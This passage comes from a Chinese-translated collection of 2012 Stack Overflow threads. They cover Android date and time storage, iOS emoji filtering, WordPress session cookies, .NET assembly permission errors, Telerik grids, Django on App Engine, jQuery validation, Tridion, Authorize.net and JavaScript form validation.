private String bundleduTime;
private String bundleduDate;
private String bundleduCateg;
public static String getRowId;
public static String newTime, newDate, newCat;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.updatedbdetails);

    now = Calendar.getInstance();
    update_button_date = (Button) findViewById(R.id.update_button_date);
    update_button_time = (Button) findViewById(R.id.update_button_time);

    update_button_date.setText(bundleduDate);
    update_button_time.setText(bundleduTime);

Bundle takeBundledData = getIntent().getExtras();

    bundleduRowId = takeBundledData.getString("clickeduRowId");
    bundleduTime = takeBundledData.getString("clickeduTime");
    bundleduDate = takeBundledData.getString("clickeduDate");
    bundleduCateg = takeBundledData.getString("clickeduCateg");
}
public void clickUpdateDelete(View v) {
    newTime = strTime;
    newDate = strDate;
    newCateg = newCat;

AddDBHelper modifyEntry = new AddDBHelper(this);
    modifyEntry.open();

    DBDetails dbdetails = new DBDetails();

    dbdetails.setuRow(bundleduRowId);

    if (v.getId() == R.id.update_button_delete) {
        modifyEntry.deleteDetails(dbdetails);
    } else if (v.getId() == R.id.update_button_save) {
        dbdetails.setuDate(newDate);
        dbdetails.setuTime(newTime);
        dbdetails.setuCateg(newCateg);
modifyEntry.updateDetails(dbdetails);
    }   
    modifyEntry.close();
    finish();
} 
```

**FuncAdd.java 类的修正**

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView (R.layout.dash_add);

    add_button_date = (Button) findViewById(R.id.add_button_date);
    add_button_time = (Button) findViewById(R.id.add_button_time);

    now = Calendar.getInstance().getTime();

    SimpleDateFormat dFormatter = new SimpleDateFormat("dd MMM yyyy");
    strDate = dFormatter.format(now);
    add_button_date.setText(strDate);

    SimpleDateFormat tFormatter = new SimpleDateFormat("KK:mm a");
    strTime = tFormatter.format(now);
    add_button_time.setText(strTime);
}

public interface DateDialogFragmentListener {
    public void updateChangedDate(int year, int month, int day);
}

public void showDialogDate() {
    FragmentTransaction ftDate = getFragmentManager().beginTransaction();
    fragDate = DateDialogFragment.newInstance(this, new DateDialogFragmentListener() {
        public void updateChangedDate(int year, int month, int day) {
            strDate = (String.valueOf(day)+"/"+String.valueOf(month+1)+"/"+String.valueOf(year));
            SimpleDateFormat dFormatter = new SimpleDateFormat("dd MMM yyyy");
            newstrDate = dFormatter.parse(strDate);
            add_button_date.setText(newstrDate);
        }}, now);
    fragDate.show(ftDate, "DateDialogFragment");
} 
```

**UpdateDBDetails.java 的修正**

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.updatedbdetails);

Bundle takeBundledData = getIntent().getExtras();

    bundleduRowId = takeBundledData.getString("clickeduRowId");
    bundleduTime = takeBundledData.getString("clickeduTime");
    bundleduDate = takeBundledData.getString("clickeduDate");

SimpleDateFormat dFormatter = new SimpleDateFormat("dd MMM yyyy");
    SimpleDateFormat tFormatter = new SimpleDateFormat("KK:mm a");

    now = Calendar.getInstance();

// no need to catch an exception, as I'm using pickers and the format can never be input incorrectly
    try {
        dDate = dFormatter.parse(bundleduDate);
        String dateArray[] = dDate.toString().split(" ");

        if (dateArray[1].equalsIgnoreCase("Jan")) {
            uMonth = 0;
        } else if (dateArray[1].equalsIgnoreCase("Feb")) {
            uMonth = 1;
        } else if (dateArray[1].equalsIgnoreCase("Mar")) {
            uMonth = 2;
        } else if (dateArray[1].equalsIgnoreCase("Apr")) {
            uMonth = 3;
        } else if (dateArray[1].equalsIgnoreCase("May")) {
            uMonth = 4;
        } else if (dateArray[1].equalsIgnoreCase("Jun")) {
            uMonth = 5;
        } else if (dateArray[1].equalsIgnoreCase("Jul")) {
            uMonth = 6;
        } else if (dateArray[1].equalsIgnoreCase("Aug")) {
            uMonth = 7;
        } else if (dateArray[1].equalsIgnoreCase("Sep")) {
            uMonth = 8;
        } else if (dateArray[1].equalsIgnoreCase("Oct")) {
            uMonth = 9;
        } else if (dateArray[1].equalsIgnoreCase("Nov")) {
            uMonth = 10;
        } else if (dateArray[1].equalsIgnoreCase("Dec")) {
            uMonth = 11;
        } 

        int uYear = Integer.parseInt(dateArray[5]);
        int uDay = Integer.parseInt(dateArray[2]);
        now.set(Calendar.YEAR, uYear);
        now.set(Calendar.MONTH, uMonth);
        now.set(Calendar.DAY_OF_MONTH, uDay);
        CurrentD = now.getTime();
        strDate = dFormatter.format(CurrentD);
        update_button_date.setText(strDate);
    } catch (ParseException e) {
        e.printStackTrace();
    }

    try {
        tDate = tFormatter.parse(bundleduTime);
        String timeArrayFull[] = tDate.toString().split(" ");
        String timeArray[] = timeArrayFull[3].split(":");
        int uHour = Integer.parseInt(timeArray[0]);
        int uMinute = Integer.parseInt(timeArray[1]);
        now.set(Calendar.HOUR_OF_DAY, uHour);
        now.set(Calendar.MINUTE, uMinute);
        CurrentT = now.getTime();
        strTime = tFormatter.format(CurrentT);
        update_button_time.setText(strTime);
    } catch (ParseException e) {
        e.printStackTrace();
    }
\\ The rest of the code does not differ from above, for launching a dialogfragment and saving the results to the DB. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:46:06.707

嗯，我真的不明白为什么它让你难住了。但是我想如果您是关系数据库的新手，那么初学者会遇到一个可以理解的问题。存储日期和时间的最佳方法是采用大多数数据库易于理解的格式，即使您不打算导出它。查看[SQLite](http://www.sqlite.org/lang_datefunc.html)网站。为了简短起见，只需将它们作为字符串以`YYYY-MM-DD`（日期）和`HH:MM:SS`（时间）格式存储在数据库中。然后，您可以使用 SQLite 的甜蜜内置函数，您可以在我提供的链接上看到这些函数 :) 希望它有所帮助。

编辑：

我还进行了一些额外的挖掘，因为我注意到我的应用程序实际上将日期和时间存储为 INTEGER 值，查看 SQLite 中的不同[数据类型](http://www.sqlite.org/datatype3.html)，但对你来说更重要的是，第 1.2 节关于日期和时间数据类型。因此，将它们保持为`TEXT`或`INTEGER`很好，只要保持一致即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T12:36:00.987

使用 Chintan 建议的格式化程序，并阅读更多内容，我设法弄清楚了。安迪，你的建议很有价值，但我在如何使用对话框片段设置/获取数据以允许保存、检索和更新数据库方面获得了更多帮助。最后，我只需要修改我的主表单活动。

```
public class FuncAdd extends DashMenuActivity implements OnClickListener {

TimeDialogFragment fragTime;
DateDialogFragment fragDate;
Button add_button_time, add_button_date;
Calendar now;
Date nowDT, newD, newT;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView (R.layout.dash_add);

    add_button_date = (Button) findViewById(R.id.add_button_date);
    add_button_time = (Button) findViewById(R.id.add_button_time);

    now = Calendar.getInstance();
    nowDT = now.getTime();

    SimpleDateFormat dFormatter = new SimpleDateFormat("dd MMM yyyy");
    strDate = dFormatter.format(nowDT);
    add_button_date.setText(strDate);

    SimpleDateFormat tFormatter = new SimpleDateFormat("KK:mm a");
    strTime = tFormatter.format(nowDT);
    add_button_time.setText(strTime);
}

public void addDateTime(View v) {
    int id = v.getId();
    switch (id) {
    case R.id.add_button_date :
        showDialogDate();
        break;
    case R.id.add_button_time :
        showDialogTime();
        break;
    default:
        break;
}}

public interface DateDialogFragmentListener {
    public void updateChangedDate(int year, int month, int day);
}

public interface TimeDialogFragmentListener {
    public void updateChangedTime(int hourOfDay, int minute);
}

public void showDialogDate() {
    FragmentTransaction ftDate = getFragmentManager().beginTransaction();
    fragDate = DateDialogFragment.newInstance(this, new DateDialogFragmentListener() {
        public void updateChangedDate(int year, int month, int day) {               
            now.set(Calendar.YEAR, year);
            now.set(Calendar.MONTH, month);
            now.set(Calendar.DAY_OF_MONTH, day);
            newD = now.getTime();
            SimpleDateFormat newDFormatter = new SimpleDateFormat("dd MMM yyyy");
            strDate = newDFormatter.format(newD);
            add_button_date.setText(strDate);
        }}, now);
    fragDate.show(ftDate, "DateDialogFragment");
}

public void showDialogTime() {
    FragmentTransaction ftTime = getFragmentManager().beginTransaction();
    fragTime = TimeDialogFragment.newInstance(this, new TimeDialogFragmentListener() {
        public void updateChangedTime(int hourOfDay, int minute) {
            now.set(Calendar.HOUR_OF_DAY, hourOfDay);
            now.set(Calendar.MINUTE, minute);
            newT = now.getTime();
            SimpleDateFormat tFormatter = new SimpleDateFormat("KK:mm a");
            strTime = tFormatter.format(newT);
            add_button_time.setText(strTime);
        }}, now);
    fragTime.show(ftTime, "TimeDialogFragment");
}
} 
```

# iphone - 阻止用户在我的应用中使用表情符号微笑

> ID：11806221
> 
> 赞同：0
> 
> 时间：2012-08-04T05:36:06.633
> 
> 标签：iphone, ios, xcode

如何防止用户使用它：

![在此处输入图像描述](../Images/7ca19d831ccf2f43280f4c7821c454e4.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T13:47:23.413

解决方案是使用 UISearchBar 委托方法：

*   (BOOL)searchBar:(UISearchBar *)searchBar shouldChangeTextInRange:(NSRange)范围替换Text:(NSString *)text

当用户输入文本时，新字符出现在“文本”变量中。如果有选择，则范围有长度，否则为 0。删除是选择但长度为 0 的文本。

为了防止某些字符被处理，您将从此委托方法返回 NO。如果你想变得花哨，你可以抓取当前文本（searchBar.text），将其更改为“不要使用 EMOJII！”，然后使用 dispatch_after() 将文本在 1 秒左右后重置为旧值。

显然，您需要弄清楚 Emojii 的 unicode 范围和/或您想要阻止的任何其他内容。

编辑：所以我对 Emojii 进行了更多研究，这就是委托方法中发生的情况：

```
- (BOOL)searchBar:(UISearchBar *)searchBar shouldChangeTextInRange:(NSRange)range replacementText:(NSString *)text
{
    for(int i=0; i<[text length]; ++i) {
        NSLog(@"UNICHAR = %x", [text characterAtIndex:i]);
    }
    unichar c = [text length] == 1 ? [text characterAtIndex:0] : (unichar)'?';
    NSLog(@"Text: %@ unichar=%C (hex=%x)", text, c, c);

    return YES;
} 
```

点击 Emojii 字符可以得到这个输出：

```
2012-08-05 10:09:21.121 Searcher[563:707] UNICHAR = d83d
2012-08-05 10:09:21.130 Searcher[563:707] UNICHAR = de28
2012-08-05 10:09:21.135 Searcher[563:707] Text:  unichar=? (hex=3f)
2012-08-05 10:09:22.031 Searcher[563:707] UNICHAR = d83d
2012-08-05 10:09:22.035 Searcher[563:707] UNICHAR = de28
2012-08-05 10:09:22.040 Searcher[563:707] Text:  unichar=? (hex=3f)
2012-08-05 10:09:22.703 Searcher[563:707] UNICHAR = d83d
2012-08-05 10:09:22.709 Searcher[563:707] UNICHAR = de28
2012-08-05 10:09:22.715 Searcher[563:707] Text:  unichar=? (hex=3f)
2012-08-05 10:09:31.964 Searcher[563:707] UNICHAR = d83d
2012-08-05 10:09:31.969 Searcher[563:707] UNICHAR = de22
2012-08-05 10:09:31.973 Searcher[563:707] Text:  unichar=? (hex=3f) 
```

所以很明显，当你使用 Emojii 键盘时，你会得到长度为 2 的文本，上面的十六进制值。Emojii 占据了 Unicode 的范围，如果你用 google 搜索，你会发现很多。

# php - wordpress wp-电子商务购物车标题/cookie问题

> ID：11806227
> 
> 赞同：5
> 
> 时间：2012-08-04T05:37:17.617
> 
> 标签：php, session, cookies, wordpress

所以我在这里有这个网站[http://www.taranmarlowjewelry.com](http://www.taranmarlowjewelry.com)当你第一次访问这个网站时，你会注意到右上角是空白的，如果你刷新页面，购物车就会出现在右上角。

我相信当您第一次访问该站点时它没有显示的原因是因为未设置 cookie 或其他原因。

如果我删除`PHPSESSID`带有值的cookie 名称`fd9lshsp92opvo9aotvoljajj0`（每次删除 cookie 并创建新的值都会更改），右上角的购物车会再次消失。

似乎 cookie 不正确……但话说回来，我对 cookie 不太了解。

我将如何正确设置此 cookie？

我不知道`PHPSESSID`在 wordpress 中设置的位置，所以我找不到它的代码……但这里是购物车的代码，不确定它是否有用。

`<div style="float:right;" class="taranShoppingCart"><?php echo wpsc_shopping_cart(); ?></div>`

吐出来....

```
<div class="shoppingcart">
<table style="color:#F69F8E;">
<tfoot>
<tr class="cart-widget-total">
<td class="cart-widget-count" style="text-align:right; padding-right:25px; padding-bottom:5px;" colspan="3">
<a href="?page_id=15">Shopping Bag  6 item(s)</a>
</td>
</tr>
<tr>
<td style="padding-right:15px;">
<a href="?page_id=15">Hello admin</a>
</td>
<td style="padding-right:15px;">
<a href="http://www.taranmarlowjewelry.com/wp-login.php?action=logout&_wpnonce=f26aa87ea3">Logout</a>
</td>
<td>
<div class="live_search_form">
<form class="product_search" action="http://www.taranmarlowjewelry.com/?page_id=14/" method="GET" style="font-size:0px !important;">
<input id="wpsc_search_autocomplete" class="wpsc_product_search wpsc_live_search_embed .wpsc_live_search" style="padding:0px !important; height:25px !important; vertical-align:top;" autocomplete="off" name="product_search">
<script type="text/javascript">
/* <![CDATA[ */
jQuery('#wpsc_search_autocomplete').keypress( function(e){
if ( e.keyCode == 13 ) {
var url = 'http://www.taranmarlowjewelry.com/?page_id=14'+'?product_search='+jQuery(this).val();
url = encodeURI(url);
jQuery(window.location).attr('href', url);
}
});
/* ]]> */
</script>
<input id="button" class="searchBtn" type="submit" value="GO" name="button">
</form>
</div>
</td>
</tr>
</tfoot>
</table>
</div> 
```

任何帮助将不胜感激，感谢您的宝贵时间。

谢谢，J

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T18:00:49.327

我确实开始写这个作为评论，但它很长，所以我们开始吧：

可能发生的情况是，当用户第一次访问您的网站时，会话被初始化并创建了 cookie。但是，在刷新之前不会获得 cookie，因为它与标头一起传递（这里可能是错误的，但我认为这就是 cookie 的工作方式）。所以基本上在第一个请求中它不存在。

您的代码需要做的是在 cookie 不存在时进行捕获，并将其存储在 cookie 中的任何数据传递给触发购物篮显示的任何内容。然后，一旦 cookie 出现，它就可以读取 cookie。

正如我所提到的，我对 Cookie 标头的事情并不完全确定，所以如果有人可以确认何时加载 Cookie 信息，那将会很有帮助。

# c# - 无法加载文件或程序集“ICSharpCode.SharpZipLib”或其依赖项之一。访问被拒绝

> ID：11806230
> 
> 赞同：0
> 
> 时间：2012-08-04T05:37:27.417
> 
> 标签：c#, sharpziplib

归档正在办公室和网站上的远程桌面（同事）上工作。我已经测试过了。

我正在编写一个服务，我也需要它。这在我的机器上不起作用，我远程工作并通过 VPN 连接。在这台机器上登录的用户属于域。

现在，在压缩之前，我正在模拟一个特殊的用户帐户。如果我不这样做，那么这甚至在网站上都不起作用。

以下是我得到的例外。我该如何解决？

```
System.IO.FileLoadException was caught
  Message=Could not load file or assembly 'ICSharpCode.SharpZipLib, Version=0.85.3.365, Culture=neutral, PublicKeyToken=1b03e6acf1164f73' or one of its dependencies. Access is denied.
  Source=Project.Helpers
  FileName=ICSharpCode.SharpZipLib, Version=0.85.3.365, Culture=neutral, PublicKeyToken=1b03e6acf1164f73
  FusionLog==== Pre-bind state information ===
LOG: User = Unknown
LOG: DisplayName = ICSharpCode.SharpZipLib, Version=0.85.3.365, Culture=neutral, PublicKeyToken=1b03e6acf1164f73
 (Fully-specified)
LOG: Appbase = file:///C:/Users/UserPC/Documents/DATA/Projects/ProjectHelperApps/ProjectHelper/TestResults/UserPC_UserPCJ-LAPTOP 2012-08-03 15_50_57/Out
LOG: Initial PrivatePath = NULL
Calling assembly : Project.Helpers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null.
===
LOG: This bind starts in default load context.
LOG: Using application configuration file: C:\Users\UserPC\Documents\DATA\Projects\ProjectHelperApps\ProjectHelper\TestResults\UserPC_UserPCJ-LAPTOP 2012-08-03 15_50_57\Out\Project.Helpers.Tests.DLL.config
LOG: Using host configuration file: 
LOG: Using machine configuration file from C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config.
LOG: Post-policy reference: ICSharpCode.SharpZipLib, Version=0.85.3.365, Culture=neutral, PublicKeyToken=1b03e6acf1164f73
LOG: Attempting download of new URL file:///C:/Users/UserPC/Documents/DATA/Projects/ProjectHelperApps/ProjectHelper/TestResults/UserPC_UserPCJ-LAPTOP 2012-08-03 15_50_57/Out/ICSharpCode.SharpZipLib.DLL.
ERR: A fatal error occurred when retrieving next codebase for download (hr = 0x80070005).

  StackTrace:
       at Project.Helpers.IO.ZipUtility.ZipFiles(String toArchivePath, String destDir, String archiveName, String password, Boolean isDir)
       at Project.Helpers.IO.FileSystem.ArchiveDirectory(String dirToArchive, String destDir, String archiveName)
  InnerException: 
```

这是存档方法：

```
public bool ArchiveDirectory(string dirToArchive, string destDir, string archiveName)
        {
            bool ok = false;

            if (!String.IsNullOrWhiteSpace(dirToArchive) &&
                    !String.IsNullOrWhiteSpace(destDir) &&
                    !String.IsNullOrWhiteSpace(archiveName) &&
                    DirectoryExists(dirToArchive))
            {
                ok = true;
                //create destination directory
                if (!DirectoryExists(destDir))
                    ok = CreateDirectory(destDir);
            }

            if (ok)
            {
                //Archive Name should have .ZIP extension, if not, add it
                if (!archiveName.ToLowerInvariant().Contains(".zip"))
                    archiveName = archiveName + ".ZIP";

                //Check that the Zip file already exists, if it does then delete it
                if (FileExists(Path.Combine(destDir, archiveName)))
                    ok = FileDelete(Path.Combine(destDir, archiveName));
            }

            if (ok)
            {
                //Start Impersonation
                _impersonate.DoImpersonate();

                //Using ZipUtility Class to Zip Directory
                try
                {
                    ZipUtility.ZipFiles(dirToArchive, destDir, archiveName, "", true);
                }
                catch (SystemException ex)
                {
                    ok = false;
                }
                //end impersonation
                _impersonate.Dispose();
            }

            if (ok)
            {
                //double check that the archived directory exists
                ok = FileExists(Path.Combine(destDir, archiveName));
            }

            return ok;
        } 
```

请注意，模拟在 CreateDirectory、FileExists 和 FileDelete 工作时没有任何问题。这 3 种方法在执行相关操作之前首先模拟。

感谢您调查它！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T05:28:15.853

通过应用以下方法解决了该问题：

1.  将 C 的所有权授予管理组并将其深入到文件级别而不是安装程序。
2.  在 C 上为管理员组应用完全控制权限并将其向下钻取到文件级别

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-16T16:29:16.950

清理 C:\Windows\Microsoft.NET\Framework\...\Temporary ASP.NET Files 中的临时文件夹。

希望这能有所帮助。

# c# - 尝试在 Telerik Gridview 中设置图片时出现空引用错误

> ID：11806232
> 
> 赞同：0
> 
> 时间：2012-08-04T05:37:35.177
> 
> 标签：c#, telerik, telerik-grid, radgridview

我正在尝试使用以下代码在 Telerik gridview 中显示图片：

```
 foreach (var item in radGridView1.Rows)
        {
            try
            {
                item.Cells["column1"].CellElement.Text = "";
                item.Cells["column1"].CellElement.StretchVertically = true;
                item.Cells["column1"].CellElement.ImageLayout = ImageLayout.Zoom;
                item.Cells["column1"].CellElement.ImageAlignment = ContentAlignment.MiddleCenter;
                item.Cells["column1"].CellElement.Image = Image.FromFile("img/1.jpg");
                pictureBox1.Image = Image.FromFile(item.Cells["Picture"].Value.ToString());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        } 
```

但是每当我尝试运行应用程序时，我都会收到一条错误消息，抱怨

> 你调用的对象是空的

它可能有什么问题？！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:41:10.417

听起来您正在取消引用一个空对象（例如`null.SomeProperty`）。

您应该在收到错误的行上放置一个断点，然后查看`null`要取消引用的对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:37:04.817

由于 RadGridView CellElements 和 RowElements 等控件中的 Telerik 虚拟化可以为 null。因此，为了格式化某些单元格，例如在 Telerik RadGridView 控件中，我们需要使用“CellFormatting”事件，如下所示：

```
 private void radGridView1_CellFormatting(object sender, CellFormattingEventArgs e)
        {
            try
            {
                if (e.CellElement.ColumnInfo.HeaderText == "Picture") 
                {
                    e.CellElement.Image = pictureBox1.Image;
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    } 
```

当然，同样的方法对于使用 RowFormatting 事件格式化某些行也是有效的。

# iphone - 在单次“按下按钮”后，用相机拍摄多张图像？

> ID：11806235
> 
> 赞同：1
> 
> 时间：2012-08-04T05:37:57.790
> 
> 标签：iphone, ios, xcode, camera

基本上，通过使用相机应用程序的自定义叠加层，我想要拍摄多张图像（在我的情况下为 5），只需按一下“捕获”按钮。

我了解以下代码：

```
- (void)takePicture:(id)sender
{
    self.pictureButton.enabled = NO;
    [self.delegate takePicture];
} 
```

导致拍摄单个图像。按下一个按钮后，有没有办法让这个动作重复 5 次？实际上，这将实现类似“突发”的效果，就像在 Camera+ 应用程序中实现的那样。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-04T05:58:39.063

试试这个代码，它从相机拍摄 5 张照片并存储在一个数组中。根据需要使用。

```
int counter;
NSMutableArray * imageArray;

-(void)takePicture
 {
       counter=0;
       UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];
[imagePicker setSourceType:UIImagePickerControllerSourceTypeCamera];
[imagePicker setDelegate:self];
[self presentModalViewController:imagePicker animated:YES];
[imagePicker release];
}

 - (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info 
{
UIImage *image= [info objectForKey:UIImagePickerControllerEditedImage];

[imageArray addObject:image];
counter++;  
if (counter<5)
{
    [self dismissModalViewControllerAnimated:NO];
    UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];
    [imagePicker setSourceType:UIImagePickerControllerSourceTypeCamera];
    [imagePicker setDelegate:self];
    [self presentModalViewController:imagePicker animated:NO];
    [imagePicker release];
}
else
{
    [self dismissModalViewControllerAnimated:YES];
}

} 
```

# django - Django App Engine 找不到 antlr3 模块

> ID：11806237
> 
> 赞同：1
> 
> 时间：2012-08-04T05:38:06.330
> 
> 标签：django, google-app-engine, django-nonrel

我正在尝试设置一个 Django 应用程序以在 GAE 上运行，并使用 on_production_server 测试在 settings.py 中的开发设置与生产设置之间进行选择。

但是，当我跑步时

```
python manage.py runserver 
```

我得到：

```
Traceback (most recent call last):
  File "manage.py", line 11, in <module>
    import settings
  File "/home/guillaume/myproject/settings.py", line 10, in <module>
    from djangoappengine.utils import on_production_server, have_appserver
  File "/home/guillaume/myproject/djangoappengine/utils.py", line 18, in <module>
    'Error was: %s' % e)
Exception: Could not get appid. Is your app.yaml file missing? 
Error was: No module named antlr3 
```

我尝试将以下内容添加到 settings.py：

```
import sys
sys.path.append('/usr/local/google_appengine/lib/') 
```

这行到 .profile 的最后：

```
PATH="$PATH:/usr/local/google_appengine/" 
```

但两者都没有摆脱错误。我对使用路径真的很陌生，所以我有点在这里盲目地摸索。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:06:19.443

Python2.5v还是2.7v？那么GAE SDK版本呢？

你[试过](http://code.google.com/p/google-app-engine-django/issues/detail?id=118)这个吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-15T12:58:53.003

在遇到同样问题时看到了这个问题。[通过从Here](http://www.antlr3.org/download/Python/)安装 antlr 3.1.1 python 运行时解决了这个问题。

# jquery - 使用 jquery.validation equalTo(other) 确保“星期日”是输入值

> ID：11806239
> 
> 赞同：2
> 
> 时间：2012-08-04T05:38:10.137
> 
> 标签：jquery, validation, jquery-validate

回复：http : [//docs.jquery.com/Plugins/Validation](http://docs.jquery.com/Plugins/Validation)

我正在设置一个简单的联系表格，并希望使用“测验”作为简单的垃圾邮件保护。

因此，我问这个问题：“星期六之后是哪一天？”。

为了能够继续提交表单，我需要弄清楚如何使用“equalTo”方法来检查用户在继续之前是否输入了“星期日”。

谁能帮我解决这个问题？我不知道该怎么办。我已经在该输入字段上设置了 class="required"，但不确定我需要添加哪些其他类才能使这一切正常工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:47:52.670

[http://docs.jquery.com/Plugins/Validation/Methods/equalTo#other](http://docs.jquery.com/Plugins/Validation/Methods/equalTo#other)

```
$(".selector").validate({
   rules: {
       userResponse: { 
           required: true, 
           equalTo: 'Sunday'
       }
   }
})​;​ 
```

# tridion - 签出组件时，IsPublished 方法抛出 InvalidUriException

> ID：11806240
> 
> 赞同：3
> 
> 时间：2012-08-04T05:38:32.707
> 
> 标签：tridion, tridion-2011

我正在循环文件夹中的组件并根据其发布状态搜索一个组件，其 DateTime 类型的一个字段位于当前日期到下一个 7 天的范围内。

但是，如果检出任何组件，则 IsPublished 方法会引发异常`InvalidUriException`。如果我不想通过捕获异常并继续循环来跳过这个签出的组件，我该如何处理这种情况？

**编辑：** 第三行抛出`InvalidUriException`检出组件。

```
componentUri = new TcmUri(node.Attributes[CommonConstants.Id].Value).GetVersionlessUri();
dummyComponent = engine.GetObject(componentUri) as Component;
bool isPublished = PublishEngine.IsPublished(dummyComponent , publicationTarget); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T12:18:58.867

无效的 uri 异常意味着 tcm id (item) 不存在。当一个组件被检出时，它可能会在 uri 中附加一个次要版本号，例如 tcm:xx-yy-yy-v1。所以你需要抓住它。

试试这个：打开检出组件的版本历史，看看最新版本的 ID 是什么。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T14:30:10.203

查看您在组件本身中传递的代码，它不应该是 TcmUri 吗？硬编码 URI 时甚至会引发异常？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-04T20:23:10.153

如果方法不支持版本 uri 或可编辑 uri，则会引发无效 uri 异常。使用无版本的uri，我认为它应该可以正常工作。你可以使用 TcmUri.GetVersionLess uri 方法。

# iphone - iOS Authorize.net 集成问题

> ID：11806248
> 
> 赞同：1
> 
> 时间：2012-08-04T05:40:04.090
> 
> 标签：iphone, ios, authorize.net

我正在开发 iOS 应用程序，其中我使用 auth.net iOS API 集成了 authorize.net 支付网关。我遵循了他们文档中提到的每一个步骤。现在，每次在实时环境中将事务请求发送到 auth.net 服务器时，都会出现错误（代码 E00007），即“由于身份验证值无效，用户身份验证失败”。我检查了登录 ID 和交易密钥，这些都是正确的。即使我尝试了 Auth.net 支持人员，但仍然没有成功。测试环境和请求成功。但是在 Live 环境中。它给了我问题

我的代码如下： 对于设备注册：这里我放了 XXXX.... 而不是真实的交易密钥和登录 ID。

```
MobileDeviceRegistrationRequest *mobileDeviceRegistrationRequest =
[MobileDeviceRegistrationRequest mobileDeviceRegistrationRequest];
mobileDeviceRegistrationRequest.mobileDevice.mobileDeviceId =
[[[UIDevice currentDevice] uniqueIdentifier]
 stringByReplacingOccurrencesOfString:@"-" withString:@"_"];
mobileDeviceRegistrationRequest.mobileDevice.mobileDescription = @"iPhone";
mobileDeviceRegistrationRequest.anetApiRequest.merchantAuthentication.name = @"XXXXXXXXX";
mobileDeviceRegistrationRequest.anetApiRequest.merchantAuthentication.password = @"XXXXXXXXXXXXXX";

[AuthNet authNetWithEnvironment:ENV_LIVE];
AuthNet *an = [AuthNet getInstance];
[an mobileDeviceRegistrationRequest:mobileDeviceRegistrationRequest]; 
```

之后付款请求的代码：

```
 MobileDeviceLoginRequest *mobileDeviceLoginRequest = [MobileDeviceLoginRequest mobileDeviceLoginRequest];
    mobileDeviceLoginRequest.anetApiRequest.merchantAuthentication.name = @"XXXXX";
    mobileDeviceLoginRequest.anetApiRequest.merchantAuthentication.password = @"XXXXXX";
    mobileDeviceLoginRequest.anetApiRequest.merchantAuthentication.mobileDeviceId =
    [[[UIDevice currentDevice] uniqueIdentifier] stringByReplacingOccurrencesOfString:@"-" withString:@"_"];

    // Set up an AuthNet instance.
    [AuthNet authNetWithEnvironment:ENV_LIVE];

    AuthNet *an = [AuthNet getInstance];
    [an setDelegate:self];

    // Process a mobile device login request.
    [an mobileDeviceLoginRequest:mobileDeviceLoginRequest]; 
```

但在初始注册请求中，我收到错误代码 E00007 的失败。我错过了什么设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T10:58:58.773

请提供交易密钥

```
mobileDeviceLoginRequest.anetApiRequest.merchantAuthentication.transactionKey = @"XXXXXX"; 
```

这个对我有用

# javascript - onsubmit 多个 javascript 函数

> ID：11806253
> 
> 赞同：9
> 
> 时间：2012-08-04T05:40:43.033
> 
> 标签：javascript, forms, function, onsubmit

有谁知道如何提交多个功能？我打算做的是：onsubmit 检查所有这些函数是否都返回 true，如果它们都返回 true，那么我执行 action="checked.html"

```
<form id="myForm" name="myForm" action="checked.html" method="post"
onsubmit="return validateName() || validatePhone() || validateAddress() ||
validateEmail()"> 
```

然而，实际发生的是，计算机从左到右检查代码，下一个函数的结果将替换前一个函数的结果，以此类推，直到结束。因此，即使所有 3 个第一个函数都返回 false，只要最后一个函数为 true，计算机将执行 action="checked.html"，这不是我打算做的......谁能帮帮我这个，我花了 4 个小时来修复它：S 谢谢！

另外，当我尝试做类似的事情时`<form onsubmit="return verify1() && verify2()">`，它不起作用，它所做的只是检查verify1（），而不是以下那些...... :(

**澄清：在提交时，我想要调用四个验证函数。除非所有四个函数都返回 true，否则应阻止提交，但即使其中一些函数返回 false，也应始终调用所有四个函数。**

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-04T06:20:46.693

使用`&`而不是`&&`.

`&&`使用短路评估，因此如果左侧操作数为假，则不评估右侧操作数。

`&`总是计算两个操作数。

```
onsubmit="return !!(validateName() & validatePhone()
                      & validateAddress() & validateEmail());" 
```

编辑：对不起，我忘了这`&`不会返回一个实际的布尔值。将表达式括在括号中并使用双`!`精度将其转换为（现在）所示。（如果在测试中使用结果，您不必担心`if`，但事件处理程序的返回值应该是一个实际的布尔值。）

PS：这是一个相当笨拙的演示，显示所有四个函数都被调用，但会产生您需要的整体真或假结果：http: [//jsfiddle.net/nnnnnn/svM4h/1/](http://jsfiddle.net/nnnnnn/svM4h/1/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-04T05:44:21.860

更改您的代码以使用 AND 而不是 OR

> onsubmit="return validateName() && validatePhone() && validateAddress() && validateEmail()"

